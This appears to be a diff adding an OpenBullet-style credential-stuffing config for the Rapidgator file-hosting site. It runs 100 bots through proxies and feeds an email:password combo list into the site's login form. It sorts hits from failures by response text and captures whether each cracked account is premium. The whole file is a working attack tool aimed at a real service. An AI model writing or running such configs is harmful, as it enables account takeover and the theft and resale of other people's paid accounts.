@@ -1,0 +1,45 @@
+[SETTINGS]
+{
+  "Name": "Rapidgator",
+  "SuggestedBots": 100,
+  "LastModified": "2018-07-10T14:08:52.5336973+00:00",
+  "AdditionalInfo": "",
+  "Author": "Praveen",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_LOGIN_PAGE REQUEST GET "https://rapidgator.net/auth/login" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#POST_LOGIN REQUEST POST "https://rapidgator.net/auth/login" AutoRedirect=TRUE 
+  CONTENT "LoginForm[email]=<USER>&LoginForm[password]=<PASS>&LoginForm%5BrememberMe%5D=1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Wrong e-mail or password" 
+    KEY "incorrect" 
+    KEY "errorSummary" 
+  KEYCHAIN Success OR 
+    KEY "Logout" 
+PARSE "<SOURCE>" LR "Account:&nbsp;<a href=\"/article/premium\">" "</a>" Recursive=FALSE -> CAP "TYPE" "" "" 
